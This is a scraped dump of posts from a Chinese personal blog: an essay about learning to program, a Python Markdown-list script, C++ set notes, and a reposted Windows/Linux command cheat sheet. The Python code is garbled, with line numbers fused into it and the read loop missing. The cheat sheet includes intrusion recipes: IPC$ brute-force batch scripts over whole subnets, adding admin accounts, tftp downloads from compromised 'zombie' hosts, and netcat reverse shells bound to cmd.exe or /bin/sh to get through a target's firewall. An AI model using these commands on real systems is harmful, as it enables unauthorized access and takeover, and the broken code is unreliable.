研究生嘛，只要不是为了搞研究，其实就是在研究人际交流，到最后拿着毕业证，总有适合自己的发展天地。所以秉承不搞研究，只为工作的思想，开始新的选择，学习编程。话说软件开发哪有那么简单，以前只是被程序员这个概念完全的迷惑了，程序员的工作内容，我认为是具有创造性的工作，这在我学习过程中体现的淋漓尽致，简单调用一个函数，导入一个包谁都会，但是怎么有逻辑性的将各个模块整合起来，如果没有经过训练是难以完美实现的，就比如你心里想的是范冰冰，但是经过自己手可能搞出来一个特朗普，丫的！还带有一大堆错误，难看，难受！本科阶段短暂的学过C和C++但是那点基础知识掌握的远远不够，和我女朋友聊起编程的内容，这个毕业两年的科班毕业生，奋斗在国企的保洁员工，掌握的知识都我全，和科班生是真的有差距，但是对于科班生相比，我们这些专业学过的基础学科确实他们没有经过的培训，所以我把目标定在了能够和他们进行竞争的数据分析和机器学习方向，经过了解现在AI火的一塌糊涂，Python也成了热门语言，我自然而然的成了Python语言的拥护者，学起来入门是真的简单，相比C++来说，真是良心语言，具体的缺点我还没搞懂，但是就是简单好学，有想法可以借助Python库和开源代码实现。确定好目标之后陆陆续续学了Linux基础命令、Python基础、Python高级特性、数据分析、数据挖掘实战、西瓜书…今年开始找实习的时候才开始慌了，数据分析报录比40:1，难以想象的火爆，看来当初的分析还是有偏差，就比如今年我们学校考研报名人数超多，那么肯定有大部分人当了炮灰，啧啧啧！没跑了，我在填炮坑的路上！路漫漫其修远兮，吾将上下而求索。现在该怎么办呢！是改变方向还是继续选择走这条道路呢！ 明天，老舅来上海出差，还是试着向老舅寻求帮助…… 后续来了呆了两天，分析后得到的结论是，胆大心细，擅于观察行业内的细节和动向。最重要的还是态度积极端正，未来可期！ 2019/4/27 星期六 下午 4:16:33","categories":[{"name":"生活随笔","slug":"生活随笔","permalink":"https://cxpeng.cn/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"}],"tags":[]},{"title":"批量添加无序号列表格式","slug":"批量添加无序号列表格式","date":"2019-04-16T05:13:09.000Z","updated":"2020-02-13T03:25:18.203Z","comments":true,"path":"archives/b759e75d.html","link":"","permalink":"https://cxpeng.cn/archives/b759e75d.html","excerpt":"","text":"在整理命令列表的时候，使用MD的时候，发现没办法批量添加无序列表，所以用python实现了下. 源代码： 12\"\"\"3 方便以后编写Markdown文档时候批量生成无序列表4 将需要操作的内容保存到制定文件中，然后运行程序即可。5\"\"\"6import os7import re89#添加无序列表格式’- ‘10def geshiHua(file):11 bk_file = create_bk(file)12 file_list = []1314 with open(bk_file, 'r', encoding='utf-8') as f:15 file_list.append(line)16# print(file_list)1718 with open(file, 'w') as f:19 for line in file_list:20 if line == '\\n':21 f.write(line)22 line = \"- \" + line23 f.write(line)24 auth = input('是否删除原文件备份（y/n）：')25 if auth == 'y':26 os.remove(bk_file)27 print('备份文件已删除！')28 else:29 pass30 print(file + ':已经格式化完成')313233#创建备份文件34def create_bk(file):35 bk_file = file + '.bk'36 os.rename(file, bk_file)37 return bk_file383940#删除备份文件41def remove(file):42 os.remove(file)434445#主程序46def main():47 file_path = r'./add_style_md.md'#用来保存待添加格式的文件48# print(file_path)49# file_path =\"\\\\\" .join(file_path)50# print(file_path)5152 geshiHua(file_path)535455if __name__ == '__main__':56 main()","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[]},{"title":"C++中的set！","slug":"C-中的set！","date":"2019-04-13T10:19:19.000Z","updated":"2020-10-23T05:33:51.955Z","comments":true,"path":"archives/fcc57c4c.html","link":"","permalink":"https://cxpeng.cn/archives/fcc57c4c.html","excerpt":"","text":"set的特点是：集合中的元素根据键值自动排序，没有重复元素 声明： set &lt;类型&gt; 名称 如： sets1; set中的函数 begin()返回指向第一个元素的迭代器 end()返回指向最后一个元素的迭代器 erase()–删除元素 只能根据元素的值删除元素，不能根据第几个元素进行删除 insert()–插入元素 clear()–清除所有元素 count()–返回某个值元素的个数 empty()–如果集合为空，返回true equal_range()–返回集合中与给定值相等的上下限的两个迭代器 find()–返回一个指向被查找到元素的迭代器 get_allocator()–返回集合的分配器 lower_bound()–返回指向大于（或等于）某值的第一个元素的迭代器 key_comp()–返回一个用于元素间值比较的函数 max_size()–返回集合能容纳的元素的最大限值 rbegin()–返回指向集合中最后一个元素的反向迭代器 rend()–返回指向集合中第一个元素的反向迭代器 size()–集合中元素的数目 swap()–交换两个集合变量 upper_bound()–返回大于某个值元素的迭代器 value_comp()–返回一个用于比较元素间的值的函数 关于迭代器： 声明：set&lt;类型&gt;::iterator 名称 set::iterator it=s.begin(); 注**迭代器的类型要与定义的set类型相同 ** 访问迭代器指向元素时使用 *名称 cout&lt;&lt;*it&lt;&lt;endl; 迭代器能自增++it;， 也可以使用 it + n; it - n; it += n; it -= n; it1 - it2; 以上操作的结果还是迭代器；","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://cxpeng.cn/tags/C/"}]},{"title":"Windows下常用命令","slug":"Windows下常用命令","date":"2019-04-13T10:19:19.000Z","updated":"2020-02-13T03:24:38.650Z","comments":true,"path":"archives/aee69fbc.html","link":"","permalink":"https://cxpeng.cn/archives/aee69fbc.html","excerpt":"","text":"转载：https://www.jb51.net/article/141568.htm 常用命令： 直接输入盘符就可以进入相应盘，如：e: cd: 进入文件夹 md: 创建文件夹 type nul&gt;: 创建空文件 echo “内容”&gt;: 创建带内容的文件 type: 查看文件内容 dir: 列出文件 rd: 删除空文件夹 rd /s/q: 删除文件及其子文件夹，包括有内容的文件 del: 删除文件 在DOS窗口下使用命令 help： ASSOC 显示或修改文件扩展名关联。 ATTRIB 显示或更改文件属性。 BREAK 设置或清除扩展式 CTRL+C 检查。 BCDEDIT 设置启动数据库中的属性以控制启动加载。 CACLS 显示或修改文件的访问控制列表(ACL)。 CALL 从另一个批处理程序调用这一个。 CD 显示当前目录的名称或将其更改。 CHCP 显示或设置活动代码页数。 CHDIR 显示当前目录的名称或将其更改。 CHKDSK 检查磁盘并显示状态报告。 CHKNTFS 显示或修改启动时间磁盘检查。 CLS 清除屏幕。 CMD 打开另一个 Windows 命令解释程序窗口。 COLOR 设置默认控制台前景和背景颜色。 COMP 比较两个或两套文件的内容。 COMPACT 显示或更改 NTFS 分区上文件的压缩。 CONVERT 将 FAT 卷转换成 NTFS。您不能转换当前驱动器。 COPY 将至少一个文件复制到另一个位置。 DATE 显示或设置日期。 DEL 删除至少一个文件。 DIR 显示一个目录中的文件和子目录。 DISKCOMP 比较两个软盘的内容。 DISKCOPY 将一个软盘的内容复制到另一个软盘。 DISKPART 显示或配置磁盘分区属性。 DOSKEY 编辑命令行、调用 Windows 命令并创建宏。 DRIVERQUERY 显示当前设备驱动程序状态和属性。 ECHO 显示消息，或将命令回显打开或关上。 ENDLOCAL 结束批文件中环境更改的本地化。 ERASE 删除一个或多个文件。 EXIT 退出 CMD.EXE 程序(命令解释程序)。 FC 比较两个文件或两个文件集并显示它们之间的不同。 FIND 在一个或多个文件中搜索一个文本字符串。 FINDSTR 在多个文件中搜索字符串。 FOR 为一套文件中的每个文件运行一个指定的命令。 FORMAT 格式化磁盘，以便跟 Windows 使用。 FSUTIL 显示或配置文件系统的属性。 FTYPE 显示或修改用在文件扩展名关联的文件类型。 GOTO 将 Windows 命令解释程序指向批处理程序中某个带标签的行。 GPRESULT 显示机器或用户的组策略信息。 GRAFTABL 启用 Windows 在图形模式显示扩展字符集。 HELP 提供 Windows 命令的帮助信息。 ICACLS 显示、修改、备份或还原文件和目录的 ACL。 IF 在批处理程序中执行有条件的处理过程。 LABEL 创建、更改或删除磁盘的卷标。 MD 创建一个目录。 MKDIR 创建一个目录。 MKLINK 创建符号链接和硬链接 MODE 配置系统设备。 MORE 逐屏显示输出。 MOVE 将一个或多个文件从一个目录移动到另一个目录。 OPENFILES 显示远程用户为了文件共享而打开的文件。 PATH 为可执行文件显示或设置搜索路径。 PAUSE 停止批处理文件的处理并显示信息。 POPD 还原由 PUSHD 保存的当前目录上一次的值。 PRINT 打印一个文本文件。 PROMPT 改变 Windows 命令提示。 PUSHD 保存当前目录，然后对其进行更改。 RD 删除目录。 RECOVER 从损坏的磁盘中恢复可读取的信息。 REM 记录批处理文件或 CONFIG.SYS 中的注释。 REN 重新命名文件。 RENAME 重新命名文件。 REPLACE 替换文件。 RMDIR 删除目录。 ROBOCOPY 复制文件和目录树的高级实用程序 SET 显示、设置或删除 Windows 环境变量。 SETLOCAL 开始用批文件改变环境的本地化。 SC 显示或配置服务(后台处理)。 SCHTASKS 安排命令和程序在一部计算机上按计划运行。 SHIFT 调整批处理文件中可替换参数的位置。 SHUTDOWN 让机器在本地或远程正确关闭。 SORT 将输入排序。 START 打开单独视窗运行指定程序或命令。 SUBST 将驱动器号与路径关联。 SYSTEMINFO 显示机器的具体的属性和配置。 TASKLIST 显示包括服务的所有当前运行的任务。 TASKKILL 终止正在运行的进程或应用程序。 TIME 显示或设置系统时间。 TITLE 设置 CMD.EXE 会话的窗口标题。 TREE 以图形显示启动器或路径的目录结构。 TYPE 显示文本文件的内容。 VER 显示 Windows 的版本。 VERIFY 告诉 Windows 验证文件是否正确写入磁盘。 VOL 显示磁盘卷标和序列号。 XCOPY 复制文件和目录树。 WMIC 在交互命令外壳里显示 WMI 信息。 查询表： net use ipipc$ “ “ /user:” “ 建立IPC空链接 net use ipipc$ “密码” /user:”用户名” 建立IPC非空链接 net use h: ipc$ “密码” /user:”用户名” 直接登陆后映射对方C：到本地为H: net use h: ipc$ 登陆后映射对方C：到本地为H: net use ipipc$ /del 删除IPC链接 net use h: /del 删除映射对方到本地的为H:的映射 net user 用户名 密码 /add 建立用户 net user guest /active:yes 激活guest用户 net user 查看有哪些用户 net user 帐户名 查看帐户的属性 net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限 net start 查看开启了哪些服务 net start 服务名 开启服务；(如:net start telnet， net start schedule) net stop 服务名 停止某服务 net time 目标ip 查看对方时间 net time 目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息 net view 查看本地局域网内开启了哪些共享 net view ip 查看对方局域网内开启了哪些共享 net config 显示系统网络设置 net logoff 断开连接的共享 net pause 服务名 暂停某服务 net send ip “文本信息” 向对方发信息 net ver 局域网内正在使用的网络连接类型和信息 net share 查看本地开启的共享 net share ipc$ 开启ipc$共享 net share ipc$ /del 删除ipc$共享 net share c$ /del 删除C：共享 net user guest 12345 用guest用户登陆后用将密码改为12345 net password 密码 更改系统登陆密码 netstat -a 查看开启了哪些端口,常用netstat -an netstat -n 查看端口的网络连接情况，常用netstat -an netstat -v 查看正在进行的工作 netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况 netstat -s 查看正在使用的所有协议使用情况 nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名 tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。 ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。 ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping) ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息 tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR .”表示删除当前目录下所有只读文件，“DEL/A-S .”表示删除当前目录下除系统文件以外的所有文件 del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同） move 盘符路径要移动的文件名 存放移动文件的路径移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖 fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，”&gt; “和”&gt; &gt;” 是重定向命令 at id号 开启已注册的某个计划任务 at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止 at id号 /delete 停止某个已注册的计划任务 at 查看所有的计划任务 at ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机 finger username @host 查看最近有哪些用户登陆 telnet ip 端口 远和登陆服务器,默认端口为23 open ip 连接到IP（属telnet登陆后的命令） telnet 在本机上直接键入telnet 将进入本机的telnet copy 路径文件名1 路径文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件 copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下 copy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件 copy ipadmin$svv.exe c: 或:copyipadmin$. 复制对方admini$共享下的srv.exe文件（所有文件）至本地C： xcopy 要复制的文件或目录树 目标地址目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件 用参数/e才可连目录下的子目录一起复制到目标地址下。 tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:server.exe 登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送 tftp -i 对方IP put c:server.exe 登陆后，上传本地c:server.exe至主机 ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时) route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息 start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令 mem 查看cpu使用情况 attrib 文件名(目录名) 查看某文件（目录）的属性 attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性 dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间 date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间 set 指定环境变量名称=要指派给变量的字符 设置环境变量 set 显示当前所有的环境变量 set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量 pause 暂停批处理程序，并显示出：请按任意键继续…. if 在批处理程序中执行条件处理（更多说明见if命令及变量） goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签） call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?） for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量） echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置 echo 信息 在屏幕上显示出信息 echo 信息 &gt;&gt; pass.txt 将”信息”保存到pass.txt文件中 findstr “Hello” aa.txt 在aa.txt文件中寻找字符串hello find 文件名 查找某文件 title 标题名字 更改CMD窗口标题名字 color 颜色值 设置cmd控制台前景和背景颜色；0=黑、1=蓝、2=绿、3=浅绿、4=红、5=紫、6=黄、7=白、8=灰、9=淡蓝、A=淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白 prompt 名称 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky ) ver 在DOS窗口下显示版本信息 winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名） format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS md 目录名 创建目录 replace 源文件 要替换文件的目录 替换文件 ren 原文件名 新文件名 重命名文件名 tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称 type 文件名 显示文本文件的内容 more 文件名 逐屏显示输出文件 doskey 要锁定的命令=字符 doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir= taskmgr 调出任务管理器 chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误 tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口 exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe path 路径可执行文件的文件名 为可执行文件设置一个路径。 cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /? regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示； regedit /e 注册表文件名 导出注册表 cacls 文件名 参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D: est.txt /D pub 设定d: est.txt拒绝pub用户访问。 cacls 文件名 查看文件的访问用户权限列表 REM 文本内容 在批处理文件中添加注解 netsh 查看或更改本地网络配置情况 IIS服务命令 iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现） iisreset /start或stop 启动（停止）所有Internet服务 iisreset /restart 停止然后重新启动所有Internet服务 iisreset /status 显示所有Internet服务状态 iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动 iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机 iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务 iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。 FTP 命令： (后面有详细说明内容) ftp的命令行格式为: ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。 －d 使用调试方式。 －n 限制ftp的自动登录,即不使用.netrc文件。 －g 取消全局文件名。 help [命令] 或 ？[命令] 查看命令说明 bye 或 quit 终止主机FTP进程,并退出FTP管理方式. pwd 列出当前远端主机目录 put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中 get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中 mget [remote-files] 从远端主机接收一批文件至本地主机 mput local-files 将本地主机中一批文件传送至远端主机 dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件 ascii 设定以ASCII方式传送文件(缺省值) bin 或 image 设定以二进制方式传送文件 bell 每完成一次文件传送,报警提示 cdup 返回上一级目录 close 中断与远程服务器的ftp会话(与open对应) open host[port] 建立指定ftp服务器连接,可指定连接端口 delete 删除远端主机中的文件 mdelete [remote-files] 删除一批文件 mkdir directory-name 在远端主机中建立目录 rename [from] [to] 改变远端主机中的文件名 rmdir directory-name 删除远端主机中的目录 status 显示当前FTP的状态 system 显示远端主机系统类型 user user-name [password] [account] 重新以别的用户名登录远端主机 open host [port] 重新建立一个新的连接 prompt 交互提示模式 macdef 定义宏命令 lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录 chmod 改变远端主机的文件权限 case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母 cd remote－dir 进入远程主机目录 cdup 进入远程主机目录的父目录 ! 在本地机中执行交互shell，exit回到ftp环境,如!ls*.zip #5 MYSQL 命令 mysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。 （例：mysql -h110.110.110.110 -Uroot -P123456 注:u与root可以不用加空格，其它也一样） exit 退出MYSQL mysqladmin -u用户名 -p旧密码 password 新密码 修改密码 grant select on 数据库.* to 用户名@登录主机 identified by “密码”; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符） show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。 use mysql； show tables; 显示库中的数据表 describe 表名; 显示数据表的结构 create database 库名; 建库 use 库名； create table 表名 (字段设定列表)； 建表 drop database 库名; drop table 表名； 删库和删表 delete from 表名; 将表中记录清空 select * from 表名; 显示表中的记录 mysqldump —opt school&gt;school.bbb 备份数据库：（命令在DOS的mysqlin目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。 win2003系统下新增命令（实用部份）： shutdown /参数 关闭或重启本地或远程主机。 参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。 例：shutdown /r /t 0 立即重启本地主机（无延时） taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。 参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。 tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。 参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。 Linux系统下基本命令 注：要区分大小写 uname 显示版本信息（同win2K的 ver） dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir） pwd 查询当前所在的目录位置 cd cd ..回到上一层目录，注意cd 与..之间有空格。cd /返回到根目录。 cat 文件名 查看文件内容 cat &gt;abc.txt 往abc.txt文件中写上内容。 more 文件名 以一页一页的方式显示一个文本文件。 cp 复制文件 mv 移动文件 rm 文件名 删除文件，rm -a 目录名删除目录及子目录 mkdir 目录名 建立目录 rmdir 删除子目录，目录内没有文档。 chmod 设定档案或目录的存取权限 grep 在档案中查找字符串 diff 档案文件比较 find 档案搜寻 date 现在的日期、时间 who 查询目前和你使用同一台机器的人以及Login时间地点 w 查询目前上机者的详细资料 whoami 查看自己的帐号名称 groups 查看某人的Group passwd 更改密码 history 查看自己下过的命令 ps 显示进程状态 kill 停止某进程 gcc 黑客通常用它来编译C语言写的文件 su 权限转换为指定使用者 telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。 ftp ftp连接上某服务器（同win2K） 批处理命令与变量 1：for命令及变量 基本格式 FOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。 批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：net use ipipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3 (set):指定一个或一组文件，可使用通配符，如：(D:user.txt)和(1 1 254)(1 -1 254),{ “(1 1 254)”第一个”1”指起始值，第二个”1”指增长量，第三个”254”指结束值，即：从1到254；“(1 -1 254)”说明：即从254到1 } command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：&amp; 来隔开 command_parameters：为特定命令指定参数或命令行开关 IN (set)：指在(set)中取值；DO command ：指执行command 参数：/L 指用增量形式{ (set)为增量形式时 }；/F 指从文件中不断取值，直到取完为止{ (set)为文件时，如(d:pass.txt)时 }。 用法举例： @echo off echo 用法格式：test.bat ..* &gt; test.txt for /L %%G in (1 1 254) do echo %1.%%G &gt;&gt;test.txt &amp; net use \\%1.%%G /user:administrator | find “命令成功完成” &gt;&gt;test.txt 存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。 /L指用增量形式（即从1-254或254-1）；输入的IP前面三位：..*为批处理默认的 %1；%%G 为变量(ip的最后一位）；&amp; 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有”命令成功完成”信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。 @echo off echo 用法格式：ok.bat ip FOR /F %%i IN (D:user.dic) DO smb.exe %1 %%i D:pass.dic 200 存为：ok.exe 说明：输入一个IP后，用字典文件d:pass.dic来暴解d:user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。 七： 2：if命令及变量 基本格式 IF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为“真”。 例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行最后返回的值不等于1，就执行后面的命令。 0 指发现并成功执行（真）；1 指没有发现、没执行（假）。 IF [not] 字符串1==字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。 例：“if “%2%”==”4” goto start”指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加” “） IF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。 例：“if not nc.exe goto end”指：如果没有发现nc.exe文件就跳到”:end”标签处。 IF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1==字符串2 命令语句 else 命令语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else 必须与 if 在同一行才有效。 当有del命令时需把del命令全部内容用&lt; &gt;括起来，因为del命令要单独一行时才能执行，用上&lt; &gt;后就等于是单独一行了；例如：“if exist test.txt. else echo test.txt.missing ”，注意命令中的“.” 系统外部命令 注：系统外部命令(均需下载相关工具) 瑞士军刀：nc.exe 参数说明： -h 查看帮助信息 -d 后台模式 -e prog程序重定向，一但连接就执行[危险] -i secs延时的间隔 -l 监听模式，用于入站连接 -L 监听模式，连接天闭后仍然继续监听，直到CTR+C -n IP地址，不能用域名 -o film记录16进制的传输 -p[空格]端口 本地端口号 -r 随机本地及远程端口 -t 使用Telnet交互方式 -u UDP模式 -v 详细输出，用-vv将更详细 -w数字 timeout延时间隔 -z 将输入，输出关掉（用于扫锚时） 基本用法： nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口 nc -l -p 80 开启本机的TCP 80端口并监听 nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口 nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的TCP 5354端口 nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口 高级用法： nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止 nc -L -p 80 &gt; c:log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:log.txt nc -L -p 80 &lt; c:honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:honeyport.txt中内容送入管道中，亦可起到传送文件作用 type.exe c:honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:honeyport.txt中内容送入管道中,亦可起到传送文件作用 本机上用：nc -l -p 本机端口 在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 *win2K nc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主机的防火墙 本机上用：nc -d -l -p 本机端口 &lt; 要传送的文件路径及名称 在对方主机上用：nc -vv 本机IP 本机端口 &gt; 存放文件的路径及名称 传送文件到对方主机 备 注： | 管道命令 &lt; 或 &gt; 重定向命令。“&lt;”，例如：tlntadmn &lt; test.txt 指把test.txt的内容赋值给tlntadmn命令 @ 表示执行@后面的命令，但不会显示出来（后台执行）；例：@dir c:winnt &gt;&gt; d:log.txt 意思是：后台执行dir，并把结果存在d:log.txt中 &gt;与&gt;&gt;的区别 “&gt;”指：覆盖；”&gt;&gt;”指：保存到(添加到）。 如：@dir c:winnt &gt;&gt; d:log.txt和@dir c:winnt &gt; d:log.txt二个命令分别执行二次比较看：用&gt;&gt;的则是把二次的结果都保存了，而用：&gt;则只有一次的结果，是因为第二次的结果把第一次的覆盖了。 八： 扫描工具：xscan.exe 基本格式 xscan -host &lt;起始IP&gt;[-&lt;终止IP&gt;] &lt;检测项目&gt; [其他选项] 扫锚”起始IP到终止IP”段的所有主机信息 xscan -file &lt;主机列表文件名&gt; &lt;检测项目&gt; [其他选项] 扫锚”主机IP列表文件名”中的所有主机信息 检测项目 -active 检测主机是否存活 -os 检测远程操作系统类型（通过NETBIOS和SNMP协议） -port 检测常用服务的端口状态 -ftp 检测FTP弱口令 -pub 检测FTP服务匿名用户写权限 -pop3 检测POP3-Server弱口令 -smtp 检测SMTP-Server漏洞 -sql 检测SQL-Server弱口令 -smb 检测NT-Server弱口令 -iis 检测IIS编码/解码漏洞 -cgi 检测CGI漏洞 -nasl 加载Nessus攻击脚本 -all 检测以上所有项目 其它选项 -i 适配器编号 设置网络适配器, &lt;适配器编号&gt;可通过”-l”参数获取 -l 显示所有网络适配器 -v 显示详细扫描进度 -p 跳过没有响应的主机 -o 跳过没有检测到开放端口的主机 -t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10 -log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件) 用法示例 xscan -host 192.168.1.1-192.168.255.255 -all -active -p 检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机 xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 